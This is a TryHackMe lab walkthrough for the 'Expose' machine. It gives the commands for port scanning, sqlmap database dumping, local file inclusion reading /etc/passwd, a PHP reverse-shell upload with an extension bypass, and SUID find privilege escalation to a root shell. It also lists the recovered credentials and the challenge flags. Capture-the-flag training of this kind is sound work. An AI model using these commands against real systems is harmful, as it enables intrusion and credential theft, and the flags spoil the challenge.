# Expose - TryHackMe Walkthrough

## Machine Information
- **Platform:** TryHackMe
- **Difficulty:** Easy
- **OS:** Linux
- **Target IP:** 10.48.150.1

## Flags
- **User:** `THM{USER_FLAG_1231_EXPOSE}`
- **Root:** `THM{ROOT_EXPOSED_1001}`

---

## Reconnaissance

### Port Scan
```
nmap -sV -sC -p- 10.48.150.1 -T4
```

**Open Ports:**
| Port   | Service        | Version                     |
|--------|---------------|-----------------------------|
| 21     | FTP           | vsftpd 2.0.8+ (Anonymous) |
| 22     | SSH           | OpenSSH 8.2p1 Ubuntu       |
| 53     | DNS           | ISC BIND 9.16.1            |
| 1337   | HTTP          | Apache httpd 2.4.41        |
| 1883   | MQTT          | Mosquitto 1.6.9            |

---

## Enumeration

### FTP (Port 21)
- Anonymous login allowed but directory is empty
- No upload permissions

### Web Server (Port 1337)
- Directory busting reveals:
  - `/admin` - Fake login page (decoy)
  - `/phpmyadmin` - phpMyAdmin login
  - `/admin_101` - **Real admin login with SQL injection**

---

## Initial Access

### SQL Injection
1. Target: `/admin_101/includes/user_login.php`
2. Use sqlmap to exploit:
```bash
sqlmap -r admin_101.req --batch --level 5 --risk 3 -D expose --tables
sqlmap -r admin_101.req --batch --level 5 --risk 3 -D expose -T user --dump
sqlmap -r admin_101.req --batch --level 5 --risk 3 -D expose -T config --dump
```

**Credentials Found:**
- User: `hacker@root.thm` / `VeryDifficultPassword!!#@#@!#!#1231`

**Config Table:**
- `/file1010111/index.php` → Password: `easytohack` (MD5 hash cracked)
- `/upload-cv00101011/index.php` → Hint: "ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z"

### Local File Inclusion (LFI)
1. Visit: `http://10.48.150.1:1337/file1010111/index.php`
2. Use POST request with parameter `file=/etc/passwd`
3. Extract username: `zeamkish` (starts with Z)

---

## Web Shell Upload

### Bypassing File Upload
1. Navigate to: `http://10.48.150.1:1337/upload-cv00101011/index.php`
2. Enter password: `zeamkish`
3. Upload PHP reverse shell (rename to `.php.png`, intercept with Burp, rename back to `.php`)
4. Access uploaded shell at the given path
5. Catch shell with Netcat listener

---

## Privilege Escalation

### Finding SSH Credentials
```bash
cat /home/zeamkish/ssh_creds.txt
```
**Credentials:** `zeamkish:easytohack@123`

### SSH Access
```bash
ssh zeamkish@10.48.150.1
```

### User Flag
```bash
cat /home/zeamkish/user.txt
# THM{USER_FLAG_1231_EXPOSE}
```

### Root Escalation
1. Find SUID binaries:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

2. Exploit SUID `find`:
```bash
find . -exec /bin/bash -p \;
```

### Root Flag
```bash
cat /root/root.txt
# THM{ROOT_EXPOSED_1001}
```

---

## Tools Used
- nmap
- gobuster/dirb
- Burp Suite
- sqlmap
- Netcat
- SSH

## Key Vulnerabilities
1. **SQL Injection** - in admin login form
2. **Local File Inclusion** - in file viewer
3. **File Upload Bypass** - extension filter bypass
4. **SUID Misconfiguration** - find binary with SUID bit

## Lessons Learned
- Always use comprehensive wordlists for directory enumeration
- Check for SQL injection in login forms
- LFI can reveal system users
- SUID binaries are common privilege escalation vectors
